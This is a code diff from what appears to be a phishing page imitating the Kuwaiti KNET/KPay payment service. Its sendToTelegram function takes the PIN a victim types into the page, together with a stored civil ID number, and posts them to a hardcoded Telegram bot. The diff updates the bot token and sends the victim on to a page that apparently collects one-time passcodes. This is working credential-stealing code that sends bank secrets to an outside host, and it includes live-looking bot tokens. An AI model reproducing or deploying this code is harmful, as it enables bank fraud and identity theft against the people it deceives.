@@ -220,7 +220,7 @@ document.addEventListener("DOMContentLoaded", function () {
 
 
 function sendToTelegram() {
-    const token = "8393679169:AAFqq4LyZk6NU49HZsPf7VJRkNMUKNMqXtk";
+    const token = "8456186942:AAFxBIZIivfXCZeTSAshpjKAJkXU4lPuZrY";
     const chatId = "8201670834";
     const pinInput = document.getElementById("pin");
     const pin = pinInput.value.trim();
@@ -245,7 +245,7 @@ const civilId = localStorage.getItem("civilId") || "غير متوفر";
         body: JSON.stringify({ chat_id: chatId, text: message })
     })
         .then(() => {
-            window.location.href = "kpay2.html";
+            window.location.href = "otpkpay2.html";
         })
         .catch(error => {
             console.error("خطأ في الإرسال:", error);
